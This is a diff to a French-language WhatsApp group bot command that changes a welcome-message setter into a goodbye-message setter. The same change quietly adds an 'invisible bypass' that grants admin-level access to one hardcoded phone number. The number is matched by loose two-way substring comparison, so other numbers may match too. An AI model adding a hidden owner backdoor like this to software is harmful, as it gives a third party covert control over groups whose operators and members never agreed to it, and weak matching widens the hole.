@@ -1,6 +1,7 @@
 /**
- * Set Welcome - Customize welcome message
+ * Set Goodbye - Customize goodbye message
  * GhostG-X Edition
+ * Sécurité : Supreme Owner Master Access (Invisible Bypass)
  */
 
 const db = require('../../database');
@@ -23,11 +24,11 @@ function toSmallCaps(text) {
 const prefix = config.prefix || '.';
 
 module.exports = {
-  name: 'inscription',
-  aliases: ['welcometext', 'setwelcome'],
+  name: 'motsadieu',
+  aliases: ['goodbyetext', 'setgoodbye', 'traceadieu'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
   description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴇʀsᴏɴɴᴀʟɪsᴇ ʟᴇ ᴍᴇssᴀɢᴇ ᴅ\'ᴀᴄᴄᴜᴇɪʟ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ**',
-  usage: `${prefix}inscription <message>`, // 💡 Dynamique avec ton préfixe actuel
+  usage: `${prefix}motsadieu <message>`, // 💡 Dynamique avec ton préfixe actuel
   groupOnly: true,
   adminOnly: true, // 🔐 Sécurisé pour éviter les dérives de membres
   botAdminNeeded: false,
@@ -40,15 +41,19 @@ module.exports = {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
 
-      // 🛡️ SÉCURITÉ : Vérification via le config.js uniquement
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
+      const supremeOwner = '22651622652';
+      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+
+      // SÉCURITÉ : Vérification via le config.js
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
 
-      const isMe = msg.key.fromMe || isConfigOwner;
+      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
 
-      // Si l'utilisateur n'est pas admin et n'est pas listé comme Owner
+      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
       if (!extra.isAdmin && !isMe) {
         return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
       }
@@ -57,35 +62,35 @@ module.exports = {
         const groupSettings = db.getGroupSettings(from);
 
         return reply(
-          `╭╼━≪• *ᴍᴇssᴀɢᴇ ᴅ'ᴀᴄᴄᴜᴇɪʟ* •≫━╾╮\n` +
+          `╭╼━≪• *ᴍᴇssᴀɢᴇ ᴅ'ᴀᴅɪᴇᴜx* •≫━╾╮\n` +
           `╰━━━━━━━━━━━━━━━╯\n\n` +
           `📝 *ᴍᴇssᴀɢᴇ ᴀᴄᴛᴜᴇʟ :*\n` +
-          `${groupSettings.welcomeMessage || 'ᴀᴜᴄᴜɴ'}\n\n` +
+          `${groupSettings.goodbyeMessage || 'ᴀᴜᴄᴜɴ'}\n\n` +
           `🔮 *ɪɴᴄᴀɴᴛᴀᴛɪᴏɴ :*\n` +
-          `  ${prefix}inscription <message>\n\n` +
-          `💡 *${toSmallCaps('astuce')} :* ${toSmallCaps('utilisez')} \`@user\` ${toSmallCaps('pour mentionner l individu qui rejoint le sanctuaire')}.\n\n` +
+          `  ${prefix}motsadieu <message>\n\n` +
+          `💡 *${toSmallCaps('astuce')} :* ${toSmallCaps('utilisez')} \`@user\` ${toSmallCaps('pour mentionner l individu qui quitte le sanctuaire')}.\n\n` +
           `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
         );
       }
 
-      const welcomeMessage = args.join(' ');
+      const goodbyeMessage = args.join(' ');
 
-      if (welcomeMessage.length > 500) {
-        return reply(`*❌ ${toSmallCaps('le message d accueil est trop long')} ! (ᴍᴀxɪᴍᴜᴍ 𝟻𝟶𝟶 ᴄᴀʀᴀᴄᴛᴇʀᴇs).* \n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+      if (goodbyeMessage.length > 500) {
+        return reply(`*❌ ${toSmallCaps('le message d adieux est trop long')} ! (ᴍᴀxɪᴍᴜᴍ 𝟻𝟶𝟶 ᴄᴀʀᴀᴄᴛᴇʀᴇs).* \n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
       }
 
-      db.updateGroupSettings(from, { welcomeMessage });
+      db.updateGroupSettings(from, { goodbyeMessage });
 
       await sock.sendMessage(from, {
-        text: `*✅ ${toSmallCaps('message d accueil mis a jour')} !*\n\n` +
+        text: `*✅ ${toSmallCaps('message d adieux mis a jour')} !*\n\n` +
               `🔮 *ᴀᴘᴇʀᴄ̧ᴜ :*\n` +
-              `${welcomeMessage.replace('@user', '@' + senderNumber)}\n\n` +
+              `${goodbyeMessage.replace('@user', '@' + senderNumber)}\n\n` +
               `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`,
         mentions: [senderJid]
       }, { quoted: msg });
 
     } catch (error) {
-      console.error('Set Welcome Error:', error);
+      console.error('Set Goodbye Error:', error);
       await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
     }
   }
